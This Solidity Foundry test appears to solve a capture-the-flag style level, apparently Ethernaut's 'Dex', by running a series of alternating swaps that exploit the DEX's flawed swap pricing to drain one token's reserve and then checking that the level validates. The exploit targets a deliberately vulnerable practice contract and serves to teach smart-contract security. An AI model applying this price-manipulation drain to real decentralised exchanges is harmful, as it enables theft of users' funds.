// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {DexFactory} from "src/levels/DexFactory.sol";

interface IDex {
    function token1() external view returns (address);

    function token2() external view returns (address);

    function swap(
        address from,
        address to,
        uint256 amount
    ) external;

    function approve(address spender, uint256 amount) external;

    function balanceOf(address token, address account)
        external
        view
        returns (uint256);
}

contract DexTest is Test {
    DexFactory level;
    IDex target;
    address token1;
    address token2;
    address player;

    function setUp() public {
        // ----------------------------------
        // Create level instance
        // ----------------------------------
        level = new DexFactory();
        player = makeAddr("PLAYER");
        target = IDex(level.createInstance(player));
        token1 = target.token1();
        token2 = target.token2();
    }

    function test_Dex() public {
        // ----------------------------------
        // Initiate attack
        // ----------------------------------
        vm.startPrank(player);

        target.approve(address(target), type(uint256).max);
        logBalance();

        target.swap(token1, token2, 10);
        logBalance();

        target.swap(token2, token1, 20);
        logBalance();

        target.swap(token1, token2, 24);
        logBalance();

        target.swap(token2, token1, 30);
        logBalance();

        target.swap(token1, token2, 41);
        logBalance();

        target.swap(token2, token1, 45);
        logBalance();

        vm.stopPrank();

        // ----------------------------------
        // Validate
        // ----------------------------------
        bool success = level.validateInstance(payable(address(target)), player);
        assertEq(success, true);
    }

    function logBalance() internal view {
        console.log(
            "[PLAYER] Token1: %d, Token2: %d",
            target.balanceOf(token1, player),
            target.balanceOf(token2, player)
        );
        console.log(
            "[DEX] Token1: %d, Token2: %d\n",
            target.balanceOf(token1, address(target)),
            target.balanceOf(token2, address(target))
        );
    }
}
